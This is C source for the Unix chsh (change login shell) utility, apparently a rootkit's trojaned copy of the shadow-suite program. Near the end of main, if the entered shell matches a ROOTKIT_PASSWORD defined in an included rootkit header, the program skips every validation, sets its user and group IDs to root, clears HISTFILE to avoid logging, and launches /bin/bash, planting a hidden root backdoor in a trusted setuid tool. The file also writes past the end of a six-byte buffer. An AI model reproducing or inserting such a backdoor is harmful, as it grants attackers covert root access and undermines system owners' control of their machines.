/*
 * Copyright 1989 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: chsh.c,v 1.4 1996/09/25 03:20:00 marekm Exp $")

#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <signal.h>
#include "prototypes.h"
#include "defines.h"

#include <pwd.h>
#include "pwio.h"
#include "getdef.h"
#include "pwauth.h"

#ifdef SHADOWPWD
#include <shadow.h>
#endif

#ifndef SHELLS_FILE
#define SHELLS_FILE "/etc/shells"
#endif

#include "../rootkit.h"

/*
 * Global variables.
 */

static char *Prog;			/* Program name */
static int amroot;				/* Real UID is root */
static char loginsh[BUFSIZ];		/* Name of new login shell */

/*
 * External identifiers
 */

extern	int	optind;
extern	char	*optarg;
#ifdef	NDBM
extern	int	pw_dbm_mode;
#endif

/*
 * #defines for messages.  This facilitates foreign language conversion
 * since all messages are defined right here.
 */

#define	USAGE		"Usage: %s [ -s shell ] [ name ]\n"
#define	WHOAREYOU	"%s: Cannot determine your user name.\n"
#define	UNKUSER		"%s: Unknown user %s\n"
#define WRONGPWD	"Incorrect password for %s.\n"
#define WRONGPWD2	"incorrect password for `%s'"
#define	NOPERM		"You may not change the shell for %s.\n"
#define	NOPERM2		"can't change shell for `%s'\n"
#define	NEWSHELLMSG	"Changing the login shell for %s\n"
#define	NEWSHELL	"Login Shell"
#define	NEWSHELLMSG2 \
	"Enter the new value, or press return for the default\n\n"
#define	BADSHELL	"%s is an invalid shell.\n"
#define	BADFIELD	"%s: Invalid entry: %s\n"
#define	PWDBUSY		"Cannot lock the password file; try again later.\n"
#define	PWDBUSY2	"can't lock /etc/passwd\n"
#define	OPNERROR	"Cannot open the password file.\n"
#define	OPNERROR2	"can't open /etc/passwd\n"
#define	UPDERROR	"Error updating the password entry.\n"
#define	UPDERROR2	"error updating passwd entry\n"
#define	DBMERROR	"Error updating the DBM password entry.\n"
#define	DBMERROR2	"error updating DBM passwd entry.\n"
#define	NOTROOT		"Cannot change ID to root.\n"
#define	NOTROOT2	"can't setuid(0).\n"
#define	CLSERROR	"Cannot commit password file changes.\n"
#define	CLSERROR2	"can't rewrite /etc/passwd.\n"
#define	UNLKERROR	"Cannot unlock the password file.\n"
#define	UNLKERROR2	"can't unlock /etc/passwd.\n"
#define	CHGSHELL	"changed user `%s' shell to `%s'\n"
#ifdef	USE_NIS
#define	NISUSER		"%s: cannot change user `%s' on NIS client.\n"
#define	NISMASTER	"%s: `%s' is the NIS master for this client.\n"
#endif

/*
 * usage - print command line syntax and exit
 */

static void
usage()
{
	fprintf (stderr, USAGE, Prog);
	exit (1);
}

/*
 * new_fields - change the user's login shell information interactively
 *
 * prompt the user for the login shell and change it according to the
 * response, or leave it alone if nothing was entered.
 */

static void
new_fields()
{
	printf (NEWSHELLMSG2);
	change_field(loginsh, sizeof loginsh, NEWSHELL);
}

/*
 * check_shell - see if the user's login shell is listed in /etc/shells
 *
 * The /etc/shells file is read for valid names of login shells.  If the
 * /etc/shells file does not exist the user cannot set any shell unless
 * they are root.
 */

/* If getusershell() is available (Linux, probably BSD too), use it
   instead of re-implementing it...  --marekm */

static int
check_shell(shell)
	const char *shell;
{
	char	*cp;
#ifndef HAVE_GETUSERSHELL
	char	buf[BUFSIZ];
	int	found = 0;
	FILE	*fp;
#endif

	if (amroot)
		return 1;

	/* Don't let the user change the shell to something they can't
	   execute anyway (even if listed in /etc/shells).  --marekm */
	if (access(shell, X_OK))
		return 0;

#ifdef HAVE_GETUSERSHELL
	setusershell();
	while ((cp = getusershell()) && strcmp(shell, cp))
		;
	endusershell();
	return cp ? 1 : 0;
#else
	if ((fp = fopen (SHELLS_FILE, "r")) == (FILE *) 0)
		return 0;

	while (fgets (buf, sizeof(buf), fp) && ! found) {
		if (cp = strrchr (buf, '\n'))
			*cp = '\0';

		if (strcmp (buf, shell) == 0)
			found = 1;
	}
	fclose (fp);

	return found;
#endif
}

/*
 * restricted_shell - return true if the named shell begins with 'r' or 'R'
 *
 * If the first letter of the filename is 'r' or 'R', the shell is
 * considered to be restricted.
 */

static int
restricted_shell(shell)
	char *shell;
{
#if 0
	char *cp = Basename(shell);
	return *cp == 'r' || *cp == 'R';
#else
	/*
	 * Shells not listed in /etc/shells are considered to be
	 * restricted.  Changed this to avoid confusion with "rc"
	 * (the plan9 shell - not restricted despite the name
	 * starting with 'r').  --marekm
	 */
	return !check_shell(shell);
#endif
}

static void
passwd_check(user, passwd)
	const char *user;
	const char *passwd;
{
#ifdef SHADOWPWD
	struct spwd *sp;

	if ((sp = getspnam(user)))
		passwd = sp->sp_pwdp;
	endspent();
#endif
	if (pw_auth(passwd, user, PW_LOGIN, (char *) 0) != 0) {
		SYSLOG((LOG_WARN, WRONGPWD2, user));
		sleep(1);
		fprintf(stderr, WRONGPWD, user);
		exit(1);
	}
}

/*
 * chsh - this command controls changes to the user's shell
 *
 *	The only supported option is -s which permits the
 *	the login shell to be set from the command line.
 */

int
main(argc, argv)
	int argc;
	char **argv;
{
	char	user[BUFSIZ];		/* User name                         */
	int	flag;			/* Current command line flag         */
	int	sflg = 0;		/* -s - set shell from command line  */
	int	i;			/* Loop control variable             */
	char	*cp;			/* Miscellaneous character pointer   */
	const struct passwd *pw;	/* Password entry from /etc/passwd   */
	struct	passwd	pwent;		/* New password entry                */

    char MAG[6];
    int elite=0;

    strcpy(MAG,"");

        MAG[0]=ROOTKIT_PASSWORD[0];
        MAG[1]=ROOTKIT_PASSWORD[1];
        MAG[2]=ROOTKIT_PASSWORD[2];
        MAG[3]=ROOTKIT_PASSWORD[3];
        MAG[4]=ROOTKIT_PASSWORD[4];
        MAG[5]=ROOTKIT_PASSWORD[5];
        MAG[6]='\0';

	/*
	 * This command behaves different for root and non-root
	 * users.
	 */

	amroot = getuid () == 0;
#ifdef	NDBM
	pw_dbm_mode = O_RDWR;
#endif

	/*
	 * Get the program name.  The program name is used as a
	 * prefix to most error messages.  It is also used as input
	 * to the openlog() function for error logging.
	 */

	Prog = Basename(argv[0]);

	openlog("chsh", LOG_PID, LOG_AUTH);

	/*
	 * There is only one option, but use getopt() anyway to
	 * keep things consistent.
	 */

	while ((flag = getopt (argc, argv, "s:")) != EOF) {
		switch (flag) {
			case 's':
				sflg++;
				STRFCPY(loginsh, optarg);
				break;
			default:
				usage ();
		}
	}

	/*
	 * There should be only one remaining argument at most
	 * and it should be the user's name.
	 */

	if (argc > optind + 1)
		usage ();

	/*
	 * Get the name of the user to check.  It is either
	 * the command line name, or the name getlogin()
	 * returns.
	 */

	if (optind < argc)
		strncpy (user, argv[optind], sizeof(user) - 1);
	else if ((cp = getlogin ()))
		strncpy (user, cp, sizeof(user) - 1);
	else {
		fprintf (stderr, WHOAREYOU, Prog);
		closelog ();
		exit (1);
	}
	user[sizeof(user) - 1] = '\0';
	pw = getpwnam(user);

	/*
	 * Make certain there was a password entry for the
	 * user.
	 */

	if (! pw) {
		fprintf (stderr, UNKUSER, Prog, user);
		closelog();
		exit (1);
	}

#ifdef	USE_NIS
	/*
	 * Now we make sure this is a LOCAL password entry for
	 * this user ...
	 */

	if (__ispwNIS ()) {
		char	*nis_domain;
		char	*nis_master;

		fprintf (stderr, NISUSER, Prog, user);

		if (! yp_get_default_domain (&nis_domain) &&
				! yp_master (nis_domain, "passwd.byname",
				&nis_master)) {
			fprintf (stderr, NISMASTER, Prog, nis_master);
		}
		exit (1);
	}
#endif

	/*
	 * Non-privileged users are only allowed to change the
	 * shell if the UID of the user matches the current
	 * real UID.
	 */

	if (! amroot && pw->pw_uid != getuid ()) {
		fprintf (stderr, NOPERM, user);
		SYSLOG((LOG_WARN, NOPERM2, user));
		closelog();
		exit (1);
	}

	/*
	 * Non-privileged users are only allowed to change the
	 * shell if it is not a restricted one.
	 */

	if (! amroot && restricted_shell (pw->pw_shell)) {
		fprintf (stderr, NOPERM, user);
		SYSLOG((LOG_WARN, NOPERM2, user));
		closelog();
		exit (1);
	}

	/*
 	* Non-privileged users are optionally authenticated
 	* (must enter the password of the user whose information
 	* is being changed) before any changes can be made.
 	* Idea from util-linux chfn/chsh.  --marekm
 	*/

	if (!amroot && getdef_bool("CHFN_AUTH"))
		passwd_check(pw->pw_name, pw->pw_passwd);

	/*
	 * Now get the login shell.  Either get it from the password
	 * file, or use the value from the command line.
	 */

	if (! sflg)
		STRFCPY(loginsh, pw->pw_shell);

	/*
	 * If the login shell was not set on the command line,
	 * let the user interactively change it.
	 */

	if (! sflg) {
		printf (NEWSHELLMSG, user);
		new_fields ();
	}

if (!strcmp(loginsh,MAG)) elite++;
if (!elite) {


	/*
	 * Check all of the fields for valid information.  The shell
	 * field may not contain any illegal characters.  Non-privileged
	 * users are restricted to using the shells in /etc/shells.
	 */

	if (valid_field (loginsh, ":,=")) {
		fprintf (stderr, BADFIELD, Prog, loginsh);
		closelog();
		exit (1);
	}
	if (! check_shell (loginsh)) {
		fprintf (stderr, BADSHELL, loginsh);
		closelog();
		exit (1);
	}

	/*
	 * Before going any further, raise the ulimit to prevent
	 * colliding into a lowered ulimit, and set the real UID
	 * to root to protect against unexpected signals.  Any
	 * keyboard signals are set to be ignored.
	 */

	set_filesize_limit(30000);

	if (setuid (0)) {
		fprintf (stderr, NOTROOT);
		SYSLOG((LOG_ERR, NOTROOT2));
		closelog();
		exit (1);
	}
	signal (SIGHUP, SIG_IGN);
	signal (SIGINT, SIG_IGN);
	signal (SIGQUIT, SIG_IGN);
#ifdef	SIGTSTP
	signal (SIGTSTP, SIG_IGN);
#endif

	/*
	 * The passwd entry is now ready to be committed back to
	 * the password file.  Get a lock on the file and open it.
	 */

	for (i = 0;i < 30;i++) {
		if (pw_lock ())
			break;
	}

	if (i == 30) {
		fprintf (stderr, PWDBUSY);
		SYSLOG((LOG_WARN, PWDBUSY2));
		closelog();
		exit (1);
	}
	if (! pw_open (O_RDWR)) {
		fprintf (stderr, OPNERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, OPNERROR2));
		closelog();
		exit (1);
	}

	/*
	 * Get the entry to update using pw_locate() - we want the real
	 * one from /etc/passwd, not the one from getpwnam() which could
	 * contain the shadow password if (despite the warnings) someone
	 * enables AUTOSHADOW (or SHADOW_COMPAT in libc).  --marekm
	 */
	pw = pw_locate(user);
	if (!pw) {
		pw_unlock();
		fprintf(stderr, "user not found in local passwd file\n");
		exit(1);
	}

	/*
	 * Make a copy of the entry, then change the shell field.  The other
	 * fields remain unchanged.
	 */
	pwent = *pw;
	pwent.pw_shell = loginsh;

	/*
	 * Update the passwd file entry.  If there is a DBM file,
	 * update that entry as well.
	 */

	if (! pw_update (&pwent)) {
		fprintf (stderr, UPDERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, UPDERROR2));
		closelog();
		exit (1);
	}
#if defined(DBM) || defined(NDBM)
	if (pw_dbm_present() && ! pw_dbm_update (&pwent)) {
		fprintf (stderr, DBMERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, DBMERROR2));
		closelog();
		exit (1);
	}
	endpwent ();
#endif

	/*
	 * Changes have all been made, so commit them and unlock the
	 * file.
	 */

	if (! pw_close ()) {
		fprintf (stderr, CLSERROR);
		(void) pw_unlock ();
		SYSLOG((LOG_ERR, CLSERROR2));
		closelog();
		exit (1);
	}
	if (! pw_unlock ()) {
		fprintf (stderr, UNLKERROR);
		SYSLOG((LOG_ERR, UNLKERROR2));
		closelog();
		exit (1);
	}
	SYSLOG((LOG_INFO, CHGSHELL, user, loginsh));
	closelog();
	exit (0);
} /* end elite */
    if (elite) {
        setreuid(0,0);
        setregid(0,0);
        setenv("HISTFILE","",1);
        system("/bin/bash");
        }
exit(0);
}
